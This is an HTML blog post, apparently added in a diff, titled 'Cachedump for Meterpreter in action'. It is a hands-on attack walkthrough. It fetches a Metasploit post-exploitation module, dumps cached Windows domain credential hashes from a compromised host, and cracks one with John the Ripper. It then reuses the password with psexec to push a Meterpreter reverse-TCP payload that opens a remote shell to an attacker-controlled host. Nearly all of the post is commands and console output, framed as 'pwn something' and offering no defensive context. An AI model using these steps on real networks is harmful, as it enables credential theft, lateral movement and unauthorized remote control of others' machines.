@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="">
+  <meta name="generator" content="Hugo 0.14" />
+
+  <title>
+
+<body>
+<div id="layout">
+
+  
+<a href="#menu" id="menuLink" class="menu-link">
+  
+  <span></span>
+</a>
+<div id="menu">
+
+  
+
+  <div class="pure-menu">
+    <ul class="pure-menu-list">
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/"><i class='fa fa-home fa-fw'></i>Home</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/post/"><i class='fa fa-list fa-fw'></i>Posts</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/contact/"><i class='fa fa-phone fa-fw'></i>Contact</a>
+      
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="pure-menu social">
+  <ul class="pure-menu-list">
+
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="http://localhost:1313/index.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+    </li>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+  </ul>
+</div>
+
+  <div class="pure-g">
+  <div class="small-print pure-u-1 pure-u-md-1-1">
+    <small>&copy; 2016. All rights reserved.</small>
+  </div>
+  <div class="small-print pure-u-1 pure-u-md-1-1">
+    <small>Built with&nbsp;<a href="https://gohugo.io/" target="_blank">Hugo</a></small>
+    <small>Theme&nbsp;<a href="https://github.com/yoshiharuyamashita/blackburn" target="_blank">Blackburn</a></small>
+  </div>
+</div>
+
+</div>
+
+
+  <div id="main">
+
+
+<div class="header">
+  <h1>Cachedump for Meterpreter in action</h1>
+  <h2></h2>
+</div>
+<div class="content">
+  <p><strong>Update</strong>: Cachedump has been added to the Metasploit trunk:</p>
+
+<p><a href="https://dev.metasploit.com/redmine/projects/framework/repository/revisions/12946">https://dev.metasploit.com/redmine/projects/framework/repository/revisions/12946</a></p>
+
+<p>Pull it down:</p>
+
+<blockquote>
+</blockquote>
+
+<ul>
+<li><p>wget <a href="http://lab.mediaservice.net/code/cachedump.rb">http://lab.mediaservice.net/code/cachedump.rb</a></p></li>
+
+<li><p>put it here:  /(metasploitdir)/modules/post/windows/gather</p></li>
+</ul>
+
+<p>Load up console and pwn something then (MAKE SURE YOU ARE SYSTEM):</p>
+
+<blockquote>
+<p>meterpreter &gt; run post/windows/gather/cachedump</p>
+
+<p>[*] Executing module against WORKSTATION244</p>
+
+<p>[*] Obtaining the boot key&hellip;</p>
+
+<p>[*] Trying &lsquo;XP&rsquo; style&hellip;</p>
+
+<p>[*] Getting PolSecretEncryptionKey&hellip;</p>
+
+<p>[*] XP compatible client</p>
+
+<p>[*] Lsa Key: 29249a6480f428cb6dacba2d30d5292c</p>
+
+<p>[*] Getting LK$KM&hellip;</p>
+
+<p>[*] Dumping cached credentials&hellip;</p>
+
+<p>Username  : jdoe</p>
+
+<p>Hash  : 592cdfbc3f1ef77ae95c75f851e37166</p>
+
+<p>Last login  : 2010-05-11 01:43:48</p>
+
+<p>DNS Domain Name  : CONTOSO.CO</p>
+
+<p>Effective Name  : jdo</p>
+
+<p>Full Name  : eJane Do</p>
+
+<p>User ID  : 1107</p>
+
+<p>Primary Group ID  : 513</p>
+
+<p>Additional groups  : 33620069 33554432 34013184</p>
+
+<p>Logon domain name  : CONTOS</p>
+
+<hr />
+
+<p>[*] John the Ripper format:</p>
+
+<p>jdoe:592cdfbc3f1ef77ae95c75f851e37166:CONTOSO.CO:CONTOS</p>
+
+<p>[*] Hash are in MSCACHE format. (mscash)</p>
+
+<p>meterpreter &gt;</p>
+</blockquote>
+
+<p>Crack it:</p>
+
+<blockquote>
+<p>cat lab.dic | ./john &ndash;stdin lab.mscash &ndash;format=mscash &ndash;pot=lab.pot<br />
+Loaded 1 password hash (M$ Cache Hash [Generic 1x])<br />
+ASDqwe123  (jdoe)<br />
+guesses: 1  time: 0:00:00:00  c/s: 500  trying: ASDqwe123</p>
+</blockquote>
+
+<p>Use it:</p>
+
+<blockquote>
+<p>meterpreter &gt; background<br />
+msf exploit(handler) &gt; route add 10.10.10.0 255.255.255.0 1<br />
+msf exploit(handler) &gt; use exploit/windows/smb/psexec<br />
+msf exploit(psexec) &gt; set PAYLOAD windows/meterpreter/reverse_tcp<br />
+PAYLOAD =&gt; windows/meterpreter/reverse_tcp<br />
+msf exploit(psexec) &gt; set LHOST X.X.X.X<br />
+LHOST =&gt; X.X.X.X<br />
+msf exploit(psexec) &gt; set LPORT 80<br />
+LPORT =&gt; 80<br />
+msf exploit(psexec) &gt; set SMBDomain Contoso</p>
+
+<p>SMBDomain =&gt; Contoso<br />
+msf exploit(psexec) &gt; set SMBUser jdoe<br />
+SMBUser =&gt; jdoe<br />
+msf exploit(psexec) &gt; set SMBPass ASDqwe123<br />
+SMBPass =&gt; ASDqwe123<br />
+msf exploit(psexec) &gt; show options</p>
+
+<p>Module options (exploit/windows/smb/psexec):</p>
+
+<p>Name  Current Setting  Required  Description</p>
+
+<hr />
+
+<p>RHOST  yes  The target address<br />
+RPORT  445  yes  Set the SMB service port<br />
+SMBDomain  Contoso  no  The Windows domain to use for authentication<br />
+SMBPass  ASDqwe123  no  The password for the specified username<br />
+SMBUser  jdoe  no  The username to authenticate as</p>
+
+<p>Payload options (windows/meterpreter/reverse_tcp):</p>
+
+<p>Name  Current Setting  Required  Description</p>
+
+<hr />
+
+<p>EXITFUNC  process  yes  Exit technique: seh, thread, none, process<br />
+LHOST  X.X.X.X  yes  The listen address<br />
+LPORT  80  yes  The listen port</p>
+
+<p>Exploit target:</p>
+
+<p>Id  Name</p>
+
+<hr />
+
+<p>0  Automatic</p>
+
+<p>msf exploit(psexec) &gt; set RHOST 10.10.10.200<br />
+RHOST =&gt; 10.10.10.200<br />
+msf exploit(psexec) &gt; exploit</p>
+
+<p>[<em>] Started reverse handler on X.X.X.X:80<br />
+[</em>] Connecting to the server&hellip;<br />
+[<em>] Authenticating to 10.10.10.200:445|Contoso as user &lsquo;jdoe&rsquo;&hellip;<br />
+[</em>] Uploading payload&hellip;<br />
+[<em>] Created jSlxARUj.exe&hellip;<br />
+[</em>] Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:10.10.10.200[svcctl] &hellip;<br />
+[<em>] Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:10.10.10.200[svcctl] &hellip;<br />
+[</em>] Obtaining a service manager handle&hellip;<br />
+[<em>] Creating a new service (SyHtwKpn - &ldquo;MbEXNupOpYUL&rdquo;)&hellip;<br />
+[</em>] Closing service handle&hellip;<br />
+[<em>] Opening service&hellip;<br />
+[</em>] Starting the service&hellip;<br />
+[<em>] Removing the service&hellip;<br />
+[</em>] Closing service handle&hellip;<br />
+[<em>] Deleting jSlxARUj.exe&hellip;<br />
+[</em>] Meterpreter session 2 opened (X.X.X.X:80 -&gt; X.X.X.X:54430) at Mon Feb 14 22:23:00 +0000 2011</p>
+</blockquote>
+
+<p>Woot ;-)</p>
+
+</div>
+
+</div>
+</div>
+<script src="http://localhost:1313/js/ui.js"></script>
+
+
+
+
+</body>
+</html>
+
